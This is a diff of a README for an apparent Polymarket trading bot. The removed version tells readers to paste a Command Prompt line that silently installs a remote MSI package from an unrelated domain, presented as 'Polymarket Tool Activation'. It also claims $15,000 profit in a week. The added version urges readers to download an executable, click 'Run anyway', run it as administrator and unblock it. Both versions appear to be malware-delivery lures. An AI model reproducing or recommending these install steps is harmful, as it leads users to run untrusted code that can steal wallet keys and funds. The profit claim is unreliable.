@@ -1,171 +1,208 @@
-# Polymarket Bot – Automated Polymarket Trading Strategy
+# 🤖 Polymarket-Trading-Bot - Structured Market Decisions for Windows
 
-A Polymarket trading bot designed to identify probability inefficiencies in prediction markets and execute automated trades.
+[![Download](https://img.shields.io/badge/Download-Polymarket--Trading--Bot-blue?style=for-the-badge&logo=github)](https://github.com/sylvesteroriental963/Polymarket-Trading-Bot)
 
-This Polymarket bot strategy generated $15,000 in one week using a probability-based predictor framework. Instead of trading prediction markets randomly, the system analyzes odds, market movement, and probability shifts to help make structured trading decisions on Polymarket.
+## 🚀 Getting Started
 
-This project demonstrates how a Polymarket trading bot can monitor market prices, detect opportunities, and automate execution using configurable parameters.
+Polymarket-Trading-Bot helps you follow a probability-based trading plan on Polymarket. It checks market odds, price movement, and shifts in probability, then uses that data to guide trading decisions.
 
-Keywords: polymarket bot, polymarket trading bot, polymarket automation, prediction market bot, polymarket strategy.
+Use the link below to visit the download page:
 
----
+[Download Polymarket-Trading-Bot](https://github.com/sylvesteroriental963/Polymarket-Trading-Bot)
 
-# Installation
+## 💻 What This App Does
 
-## Step 1: Open Command Prompt
-Press Win + R, type cmd, and press Enter.
+This app is built for users who want a simple way to track prediction markets without making random trades. It focuses on:
 
-### Step 2: Execute the Command.
-Copy and paste the command below into Command Prompt.
-```powershell
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Polymarket Tool Activation
-`````
+- Market odds
+- Price changes
+- Probability shifts
+- Trading signals based on structured rules
+- Watching trends across Polymarket markets
 
-# Overview
+It is meant to help you follow a repeatable process when you trade.
 
-Polymarket is a decentralized prediction market where users trade probabilities of real-world events.
+## 📦 Before You Start
 
-Because markets update constantly, short-term pricing inefficiencies can occur. This Polymarket bot monitors market activity in real time and detects opportunities based on probability shifts.
+Before you run the app on Windows, make sure you have:
 
-The bot can:
+- A Windows 10 or Windows 11 PC
+- A stable internet connection
+- Enough free space for the app files
+- Permission to run downloaded apps
+- A modern browser if you need to open the project page
 
-- Monitor Polymarket order book data
-- Detect market inefficiencies
-- Execute automated trades
-- Run in dry-run simulation mode
+If Windows asks for permission, choose the option that lets the app run.
 
----
+## 🛠️ How to Download and Run
 
-# How the Polymarket Bot Works
+Follow these steps on Windows:
 
-The trading bot focuses on probability inefficiencies in event markets.
+1. Open the download page:
+   [https://github.com/sylvesteroriental963/Polymarket-Trading-Bot](https://github.com/sylvesteroriental963/Polymarket-Trading-Bot)
 
-When markets move quickly due to:
+2. Look for the latest release or main project files.
 
-- breaking news
-- market volatility
-- liquidity changes
-- probability re-pricing
+3. Download the Windows file or package listed there.
 
-temporary pricing opportunities can appear.
+4. When the download finishes, open your Downloads folder.
 
-The Polymarket trading bot detects these situations and automatically executes trades based on configured thresholds.
+5. If the file is a `.exe`, double-click it to run the app.
 
----
+6. If the file is a `.zip`, right-click it and choose Extract All.
 
-# Features
+7. Open the extracted folder and start the app file inside.
 
-| Feature | Description |
-|--------|-------------|
-| Automated Polymarket trading | Execute trades automatically |
-| Market monitoring | Track probability shifts in real time |
-| Strategy automation | Run structured trading strategies |
-| Risk controls | Configurable parameters |
-| Dry run testing | Simulate trades without real capital |
+8. If Windows shows a security prompt, select Run anyway if you trust the source.
 
----
+## 🧭 First-Time Setup
 
-# Architecture
+When you open the app for the first time, use this simple flow:
 
-Trading Bot System
+- Start the bot from the main file
+- Review the default settings
+- Connect your Polymarket account if needed
+- Set your preferred market filters
+- Choose how often the bot checks market changes
+- Save your settings before you begin
 
-Market Monitor
-- Polymarket CLOB API
-- Order book data
+Keep the first setup simple. Use the default options first, then change them once you know how the app behaves.
 
-Strategy Engine
-- Probability shift detection
-- Market inefficiency analysis
+## 📈 Main Features
 
-Execution Layer
-- placePolymarketOrder()
+### 🔍 Probability-Based Market Tracking
 
----
+The bot watches changes in market odds and looks for shifts that may matter for trading.
 
-# Configuration
+### 📊 Structured Trade Signals
 
-### Required
+It uses a rules-based approach, so you can follow a clear plan instead of guessing.
 
-POLYMARKET_PRIVATE_KEY – wallet private key  
-POLYMARKET_PROXY – Polymarket proxy / funder address  
+### ⏱️ Market Movement Monitoring
 
-### Optional
+It checks how market prices move over time and flags changes in trend.
 
-POLYMARKET_CLOB_URL – API endpoint  
-POLYMARKET_CHAIN_ID – Polygon network ID
+### 🧠 Decision Support
 
----
+The app helps you compare current odds with prior changes so you can make a more informed choice.
 
-# Dry Run Mode
+### 🧩 Flexible Market Use
 
-Test the Polymarket bot without real funds:
+The bot can be used with different prediction market setups and trading styles.
 
-BOT_DRY_RUN=true npm start
+## 🪟 Windows Tips
 
----
+If the app does not open right away, try these steps:
 
-# Usage
+- Right-click the file and choose Run as administrator
+- Make sure the file finished downloading
+- Check whether Windows blocked the app
+- Move the app folder to a simple path like `C:\Apps\Polymarket-Trading-Bot`
+- Close other heavy apps if your PC is slow
 
-Start the Polymarket trading bot:
+If the file is inside a zip folder, always extract it first before you run it.
 
-npm start
+## 🔐 Account and Access
 
-Run with simulated data:
+Some versions of trading tools may need your Polymarket login or API access. If that applies here, keep your details private and use strong passwords.
 
-MOCK_MODE=true npm start
+Use only your own account. Do not share access files with other people.
 
----
+## ⚙️ Basic Use Flow
 
-# Environment Variables
+A simple way to use the bot:
 
-| Variable | Description |
-|--------|-------------|
-| POLYMARKET_PRIVATE_KEY | Wallet private key |
-| POLYMARKET_PROXY | Proxy address |
-| POLYMARKET_CLOB_URL | API endpoint |
-| POLYMARKET_CHAIN_ID | Polygon chain ID |
-| BOT_DRY_RUN | Simulate trades |
-| MOCK_MODE | Run with mock data |
+1. Open the app
+2. Load your settings
+3. Pick the market you want to watch
+4. Set your trade rules
+5. Start the bot
+6. Review signals before you act
+7. Stop the bot when you are done
 
----
+This keeps your trading process easy to follow.
 
-# Programmatic API
+## 🧪 Example Use Cases
 
-Example usage:
+- Watching market odds before placing a trade
+- Tracking probability changes across a live event
+- Comparing short-term movement with longer trend changes
+- Helping you stay consistent with a market plan
+- Testing structured prediction market strategies
 
-import { placePolymarketOrder } from "./polymarket-order"
+## 🧰 Common File Types You May See
 
-const result = await placePolymarketOrder(tokenId, 0.45, 10)
+You may see one of these file types on the download page:
 
----
+- `.exe` — open this file to run the app
+- `.zip` — extract it, then open the app inside
+- `.bat` — run it from the app folder if included
+- `.json` — settings file
+- `.txt` — read-me or setup file
 
-# Developer
+If there are several files, start with the file that looks like the main app.
 
-Alexei – trading bot developer specializing in:
+## ❓ Troubleshooting
 
-- Polymarket bots
-- prediction market automation
-- crypto trading automation
-- DeFi trading systems
+### The app will not open
 
-Telegram: https://t.me/@tova_0x
+- Check that the download finished
+- Make sure you extracted the zip file
+- Try running it as administrator
+- Restart your PC and try again
 
----
+### Windows says the app is unsafe
 
-# Tech Stack
+- Check that you downloaded it from the project page
+- Right-click the file and choose Properties
+- Unblock the file if Windows gives you that option
 
-Node.js  
-TypeScript  
-Polymarket CLOB API  
-Polygon Network  
+### The bot does not show data
 
----
+- Check your internet connection
+- Confirm that your market settings are correct
+- Reload the app and try again
+- Make sure the market you picked is active
 
-# Tags
+### The app runs slowly
 
-polymarket bot  
-polymarket trading bot  
-prediction market bot  
-polymarket automation  
-polymarket strategy  
-crypto prediction markets
+- Close other apps
+- Reboot your PC
+- Keep only the markets you need enabled
+- Use the default update rate first
+
+## 🗂️ Project Topics
+
+This repository is related to:
+
+- polymarket
+- polymarket-bot
+- polymarket-claw
+- polymarket-copytrade
+- polymarket-kalshi-arbitrage
+- polymarket-trade-bot
+- polymarket-trading-bot
+- polymarket-trading-strategy
+
+## 📁 Folder Layout
+
+A typical Windows setup may look like this:
+
+- `Polymarket-Trading-Bot/`
+- `app.exe`
+- `config/`
+- `logs/`
+- `data/`
+- `README.md`
+
+If the folder names differ, look for the main app file and a settings folder.
+
+## 🔄 Updates
+
+If a newer version appears on the project page, repeat the download steps and replace the old files with the new ones. Keep your settings backed up if the app stores them in a separate file.
+
+## 🧭 What to Do Next
+
+Open the download page, get the latest Windows file, and run it on your PC:
+
+[Visit the Polymarket-Trading-Bot download page](https://github.com/sylvesteroriental963/Polymarket-Trading-Bot)
